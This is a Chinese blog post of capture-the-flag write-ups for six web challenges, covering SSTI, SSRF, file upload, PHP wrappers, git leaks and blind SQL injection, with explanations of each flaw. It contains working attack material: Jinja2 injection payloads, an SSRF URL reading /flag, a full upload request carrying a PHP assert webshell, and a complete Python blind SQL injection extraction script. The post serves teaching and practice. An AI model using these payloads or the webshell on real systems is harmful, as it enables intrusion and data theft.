---
title: "NewStar_Week3_Web - Rycarls little blog"
source: "https://blog.rycarl.cn/index.php/2025/11/01/newstar_week3_web/"
author:
  - "[[Rycarl]]"
published:
created: 2026-06-09
description: "who'ssti SSTI也是CTF中一个经典的考点 这里我们就简单讲一下原理，深入探索得靠你们自己了 SSTI（Server-Side Template Injection，服务端模板注入）是一种严重的Web安全漏洞，它允许攻击者利用应用程序中的模板引擎执行恶意代码。 有的时候为了方便，人们..."
tags:
  - "clippings"
---
---
title: "NewStar_Week3_Web - Rycarls little blog"
source: "https://blog.rycarl.cn/index.php/2025/11/01/newstar_week3_web/"
author: "[[Rycarl]]"
published: ""
created: "2026-06-09T21:08:31+08:00"
description: "who'ssti SSTI也是CTF中一个经典的考点 这里我们就简单讲一下原理，深入探索得靠你们自己了 SSTI（Server-Side Template Injection，服务端模板注入）是一种严重的Web安全漏洞，它允许攻击者利用应用程序中的模板引擎执行恶意代码。 有的时候为了方便，人们..."
tags: [clippings]
---

# NewStar_Week3_Web - Rycarls little blog

## NewStar\_Week3\_Web

1,083次阅读

[

一条评论

](#comments)

共计 9882 个字符，预计需要花费 25 分钟才能阅读完成。

## who’ssti

SSTI 也是 CTF 中一个经典的考点  
这里我们就简单讲一下原理，深入探索得靠你们自己了

SSTI（Server-Side Template Injection，服务端模板注入）是一种严重的 Web 安全漏洞，它允许攻击者利用应用程序中的模板引擎执行恶意代码。  
有的时候为了方便，人们会写一个叫做模板的东西，但是这样的话上面的内容就是固定的。为了使不同人看到的东西不一样，我们在模板中留下一个占位符，然后模板引擎来渲染这些模板，将 Python 数据插入到 HTML 的占位符中，从而生成最终的网页，使每个人看到的界面不完全一样。

而 SSTI 漏洞的成因主要是由于服务端接收了用户的恶意输入后，未经任何处理就将其作为 Web 应用模板内容的一部分。模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，从而可能导致敏感信息泄露、代码执行、命令执行、任意文件读取、任意文件写入等问题。其影响范围主要取决于模版引擎的复杂性。  
比如这里是一段没有漏洞的示例代码

```python
from flask import Flask, request

 

app = Flask(__name__)

 

@app.route('/', methods=['GET', 'POST'])

def hello():

    if request.method == 'POST':

        name = request.form.get('name', '')

    else:

        name = request.args.get('name', '')

    return f"Hello {name}"

 

if __name__ == '__main__':

    app.run(debug=True)
```

服务器获得用户传来的数据后把数据插入我们事先准备好的占位符中  
![NewStar_Week3_Web](https://img2024.cnblogs.com/blog/3552648/202511/3552648-20251106161803366-1243630667.png "NewStar_Week3_Web")

而 ssti 漏洞就类似于 SQL 注入一样，把用户输入拼接进模板里面  
比如下面这段代码:

```python
from flask import Flask, request, render_template_string

 

app = Flask(__name__)

 

@app.route('/')

def hello():

    name = request.args.get('name', 'World')

    template = "Hello" + name + "!"

    return render_template_string(template)

 

if __name__ == '__main__':

    app.run(debug=True)
```

可以看到代码使直接把我们输入拼接进去的，这时我们就可以输入恶意代码  
让后端执行了用户插入的可以破坏模板的语句  
比如这里输入{{7\*7}}  
  
这是最典型的 SSTI 漏洞

**接下来我们来看题目**  
运行题目看到需要我们调用函数  
  
查看一下源码

```xml
@app.route('/', methods=["GET", "POST"])

def index():

  submit = request.form.get('submit')

  if submit:

    sys.settrace(trace_calls)

    print(render_template_string(submit))

    sys.settrace(None)

    if BoleanFlag:

      return jsonify({"flag": RealFlag})

    return jsonify({"status": "OK"})

  return render_template_string('''<!DOCTYPE html>

<html lang="zh-cn">

<head>

    <meta charset="UTF-8">

    <title> 首页 </title>

</head>

<body>

    <h1> 提交你的代码，让后端看看你的厉害！</h1>

    <form action="/" method="post">

        <label for="submit"> 提交一下：</label>

        <input type="text" id="submit" name="submit" required>

        <button type="submit"> 提交 </button>

    </form>

    <div style="margin-top: 20px;">

        <p> 尝试调用到这些函数！</p>

    {% for func in funcList %}

        <p>{{func}}</p>

    {% endfor %}

    <div style="margin-top: 20px; color: red;">

        <p> 你目前已经调用了 {{called_funcs|length}} 个函数：</p>

        <ul>

        {% for func in called_funcs %}

            <li>{{func}}</li>

        {% endfor %}

        </ul>

    </div>

</body>

<script>

</script>

</html>

'''

     ,

funcList = need_List, called_funcs = [func for func, called in need_List.items() if called])

 

if __name__ == '__main__':

 

  app.run(host='0.0.0.0', port=5000, debug=False)
```

很经典的 SSTI 模板注入 [从 0 开始的模板注入](https://xz.aliyun.com/news/3311)  
我们可以直接通过命令执行导入模块后执行

```
{{lipsum.__globals__['__builtins__']['__import__']('random').choice(['a','b','c']) }}

{{lipsum.__globals__['__builtins__']['__import__']('statistics').fmean([1.0, 2.0]) }}

{{lipsum.__globals__['__builtins__']['__import__']('textwrap').dedent('aaa') }}

{{lipsum.__globals__['__builtins__']['__import__']('re').search('a', 'aaa') }}

{{lipsum.__globals__['__builtins__']['__import__']('re').findall('a', 'aaa') }}
```

调用完全部函数后就会输出 flag  

## mygo!!!

我们先进行目录扫描  
发现有个 flag.php  
访问后提示只要本地的  

再看看 index.php  
可以看到提供了下载音乐的链接

  
下载链接的格式为

```perl
https://eci-2ze2tje1a1bgj973234e.cloudeci1.ichunqiu.com:80/index.php?proxy=http%3A%2F%2Flocalhost%2Fshichaoban.mp3
```

我们可以看到有个 proxy 参数指向的本地  
那么我们很容易就能想到是 ssrf

什么是 ssrf？  
SSRF(Server-Side Request Forgery: 服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。

一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）  
  
**SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。**

比如, 黑客操作服务端从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf 是利用存在缺陷的 web 应用作为代理攻击远程和本地的服务器

我们输入

```perl
https://eci-2ze2tje1a1bgj973234e.cloudeci1.ichunqiu.com:80/index.php?proxy=http://127.0.0.1/flag.php
```

然后可以看到一段 php 代码

```php
<?php

$client_ip = $_SERVER['REMOTE_ADDR'];

 

// 只允许本地访问

if ($client_ip !== '127.0.0.1' && $client_ip !== '::1') {header('HTTP/1.1 403 Forbidden');

    echo "你是外地人，我只要" 本地 "人";

    exit;

}

 

highlight_file(__FILE__);

if (isset($_GET['soyorin'])) {$url = $_GET['soyorin'];

 

    echo "flag 在根目录";

    // 普通请求

    $ch = curl_init($url);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false); // 直接输出给浏览器

    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    curl_setopt($ch, CURLOPT_BUFFERSIZE, 8192);

    curl_exec($ch);

    curl_close($ch);

    exit;

}

 

?>
```

可以看到使用了 curl 来请求而且没有限制  
那么我们就可以用 url 伪协议 # [URL 伪协议](https://www.cnblogs.com/-mo-/p/11673190.html)  
我们使用 file 协议访问根目录下的 flag

```perl
https://eci-2ze2tje1a1bgj973234e.cloudeci1.ichunqiu.com:80/index.php?proxy=http://127.0.0.1/flag.php?soyorin=file:///flag
```

成功拿到 flag  

## mirror\_gate

打开后是一个文件上传系统  
我们按 F12 看看前端源码，发现存在提示  

解码后可以看到  
  
那么我们访问一下 /uploads  
发现是 403  
  
那就扫描一下看看  
发现存在一个.htaccess  
  
.htaccess 是干嘛的?[.htaccess 利用](https://xz.aliyun.com/news/7862)  
那么我们访问后可以看到  
  
这个意思是把.webp 的文件当作 php 文件解析  
那么我们就可以上传.webp 的一句话木马  
经过测试后发现系统对上传文件的内容也会校验  
文件内容不能存在 php,eval  
同时校验文件头，我们在文件前面加上一个 GIF89a 绕过文件头校验  
然后使用 assert 代替 eval 函数  
最后的 payload 数据包

```makefile
POST /upload.php HTTP/1.1

Host: eci-2ze88asxpkuwsyhoaem1.cloudeci1.ichunqiu.com

Connection: keep-alive

Content-Length: 333

Cache-Control: max-age=0

sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"

sec-ch-ua-mobile: ?0

sec-ch-ua-platform: "Windows"

Origin: https://eci-2ze88asxpkuwsyhoaem1.cloudeci1.ichunqiu.com

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryE3r5LeGom2GL0NKQ

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Referer: https://eci-2ze88asxpkuwsyhoaem1.cloudeci1.ichunqiu.com/

Accept-Encoding: gzip, deflate, br, zstd

Accept-Language: zh-CN,zh;q=0.9

 

------WebKitFormBoundaryE3r5LeGom2GL0NKQ

Content-Disposition: form-data; name="files[]"; filename="111.webp"

Content-Type: application/octet-stream

 

GIF89a

<?= @assert($_POST['123']); ?>

------WebKitFormBoundaryE3r5LeGom2GL0NKQ

Content-Disposition: form-data; name="MAX_FILE_SIZE"

 

5242880

------WebKitFormBoundaryE3r5LeGom2GL0NKQ--
```

服务器会返回上传文件路径  
  
然后访问 uploads/20251106\_052047\_111.webp  
成功执行命令得到 flag  

## ez-chain

上来就是源码贴脸

```php
<?php

header('Content-Type: text/html; charset=utf-8');

function filter($file) {$waf = array('/',':','php','base64','data','zip','rar','filter','flag');

    foreach ($waf as $waf_word) {if (stripos($file, $waf_word) !== false) {

            echo "waf:".$waf_word;

            return false;

        }

    }

    return true;

}

 

function filter_output($data) {$waf = array('f');

    foreach ($waf as $waf_word) {if (stripos($data, $waf_word) !== false) {

            echo "waf:".$waf_word;

            return false;

        }

    }

    while (true) {$decoded = base64_decode($data, true);

        if ($decoded === false || $decoded === $data) {break;}

        $data = $decoded;

    }

    foreach ($waf as $waf_word) {if (stripos($data, $waf_word) !== false) {

            echo "waf:".$waf_word;

            return false;

        }

    }

    return true;

}

 

if (isset($_GET['file'])) {$file = $_GET['file'];

    if (filter($file) !== true) {die();

    }

    $file = urldecode($file);

    $data = file_get_contents($file);

    if (filter_output($data) !== true) {die();

    }

    echo $data;

}

highlight_file(__FILE__);

 

?>
```

我们稍微看一下大概知道代码是存在文件包含漏洞的  
而且有对输入和输出的检测  
根据 `$file = urldecode($file);` 我们可以考虑双重 URL 编码绕过 waf  
但是文件输出也有检测该怎么办?  
既然涉及到了文件包含，那么我们就能想到 php 伪协议

**什么是 php 伪协议?**  
PHP 伪协议（PHP Wrappers）是一种 PHP 提供的特殊协议或方案，允许程序通过不同的“协议”或“方案”来访问不同类型的数据资源。这些伪协议通常在文件操作或流处理时使用，可以用于访问远程文件、数据或本地文件，甚至是某些 PHP 函数内部的特定处理。PHP 伪协议可以让你通过特定的 URL 结构或数据流方式与文件进行交互。

简单理解就是通过不同的前缀来让 php 执行不同方式的代码

常见 php 伪协议类型

```kotlin
file:// — 通过 URL 访问本地文件系统

 

http:// — 访问 HTTP(s) 网址，读取远程网站的数据

 

https:// — 访问 HTTP(s) 网址，读取远程网站的数据

 

ftp:// — 访问 FTP(s) URLs，通过 FTP 协议与远程服务器进行交互，读取或者上传文件

 

php:// — 访问各个输入 / 输出流（I/O streams）zip:// — 压缩流，用于处理 zip 文件中的文件，支持读取解压修改文件

 

data:// — 数据（RFC 2397），允许数据以 URL 的编码的方式嵌入到请求中。它可以在不涉及文件系统的情况下处理数据

 

glob:// — 查找匹配的文件路径模式

 

phar:// — PHP 归档，将多个 PHP 文件打包成一个文件的格式，类似于 tar，zip，可以用来访问 php 归档文件中的文件和资源

 

ssh2:// — Secure Shell 2

 

rar:// — RAR

 

ogg:// — 音频流

 

expect:// — 处理交互式的流
```

php 伪协议中有一个非常强大的协议 —php://filter  
它可以编码并输出文件内容  
他的协议如下  
php://filter/\[操作类型 = 过滤器列表\]/resource= 目标文件  
我们可以指定编码方式为 rot13 然后编码  
记得双重 url 编码绕过输入检测  
  
然后我们可以让 AI 解密得到 flag  

## 小 E 的秘密计划

根据题目描述我们可以猜到是敏感信息泄露  
`信息泄露的本质是​​敏感数据的“非预期暴露”​​。这些数据可能存储在服务器文件系统、数据库、日志中，或通过接口、错误信息直接返回给客户端。攻击者的目标是通过各种手段（如直接访问、路径猜测、日志分析），找到这些“本应被保护”的信息。`

  
我们扫描一下发现存在 www.zip 文件  
  
那么下载下来可以看到源代码  
打开后发现二级文件夹，进去后有一个 php 文件

```php
<?php

require_once 'user.php';

$userData = getUserData();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {$username = $_POST['username'] ?? '';

    $password = $_POST['password'] ?? '';

 

    if ($username === $userData['username'] && $password === $userData['password']) {header('Location: /secret-xxxxxxxxxxxxxxxxxxx');

        exit();} else {

        echo '登录失败, 在 git 里找找吧';

        exit();}

}
```

提示我们在 git 找找，那么肯定就要使用 git 来恢复历史文件了  
我们打开 git  
使用 git log 查看历史  
  
我们回滚到添加提示的地方  
然后我们使用 git reset –hard 5f8ecc 回滚到提示  
  
提示我们分支  
那我们用 git branch 查看分支  
  
但是我们发现只有 master 分支  
我们考虑使用 git relog 查看所有记录  
  
发现了一个测试的 branch，我们回到那个分支看看  
发现多了一个 user.php  
  
里面有账号密码  
登陆后来到第三个界面  
  
扫描目录后发现.DS\_store 泄露  
  
这个文件一般会泄露目录结构  
我们从网上找到一个利用工具  
然后可以得到 flag 路径  
  
最后得到 flag  

## 白帽小 K 的故事（2）

点开后发现一个搜索框  
点击后向 search 路由发送一个带 name 参数的数据包  
  
但是我们发现这关过滤有点狠，而且只过滤了所有的空白字符，这代表着我们的 payload 不能有需要空格的地方  
在网上搜索一番可知，我们可以使用括号代替一部分的空格那么使用布尔盲注下面是脚本

```python
from http.client import responses

 

import requests

import time

 

# ================ 配置区域 ==================

URL = "https://eci-2zeck33krj7j8a1lt5na.cloudeci1.ichunqiu.com:80/search"  # 目标 URL

PARAM = "name"               # 注入的参数名（POST 表单字段）TRUE_KEYWORD = "ok"          # 条件为真时页面返回的内容特征

DATABASE = "Terra"           # 目标数据库名

# ===========================================

 

# 请求头（模拟浏览器，避免被识别为机器人）headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",

    "Content-Type": "application/x-www-form-urlencoded",  # 常见的 POST 表单类型

}

 

# 创建会话

session = requests.Session()

 

def is_true(payload):

    """发送 POST 请求，判断注入条件是否为真"""

    # 构造 POST 数据：{"name": "payload"}

    data = {PARAM: payload}

    try:

        #print(payload)

        response = session.post(URL, data=data, headers=headers, timeout=10)

        #print(response.text)

        return TRUE_KEYWORD in response.text

    except Exception as e:

        print(f"[!] 请求错误: {e}")

        return False

 

def extract_char(position, target_str):

    """使用二分法猜解指定位置的字符 ASCII 值"""

    low = 32   # 可打印字符起始

    high = 126 # 可打印字符结束

 

    while low <= high:

        mid = (low + high) // 2

        # 构造 SQL 注入 payload

        injection = (f"amiy'+IF((((ord(mid((Select(group_concat(flag))from(Flag.flag)),{position},1))))>({mid})),'a','1')#"

        )

#amiy'+IF((((ord(mid((Select(group_concat(schema_name))from(infOrmation_schema.schemata)),{position},1))))>({mid})),'a','1')#

        if is_true(injection):

            low = mid + 1

        else:

            high = mid - 1

 

    return chr(low) if low <= 126 else '?'

 

def extract_table_names():

    """主函数：提取指定数据库中的所有表名"""

    print(f"[*] 开始盲注，目标数据库: {DATABASE}")

    result = ""

    position = 1

 

    while True:

        char = extract_char(position, DATABASE)

 

        # 判断是否为有效字符

        if ord(char) < 32 or ord(char) > 126:

            print(f"n[+] 猜解结束。")

            break

 

        result += char

        print(f"r[+] 当前结果: {result}", end="", flush=True)

 

        # 防止请求过快

        time.sleep(0.1)

        position += 1

 

        # 安全限制

        if position > 100:

            print("n[!] 长度超限，停止。")

            break

 

    print(f"n[+] 成功提取表名: {result}")

    return result

 

# ================ 执行 ==================

if __name__ == "__main__":

    try:

        extract_table_names()

    except KeyboardInterrupt:

        print("nn[!] 用户中断。")

    except Exception as e:

        print(f"n[!] 发生异常: {e}")
```

injection 那一行可以修改查询哪个数据库

其实 SQL 注入入门特别简单，但是你会遇到各种各样的 waf，这个时候就考验你对各种数据库语法的知识和理解了  
最后成功拿到 flag  

正文完

0

版权声明：本站原创文章，由 于2025-11-01发表，共计9882字。

转载说明：除特殊说明外本站文章皆由CC-4.0协议发布，转载请注明出处。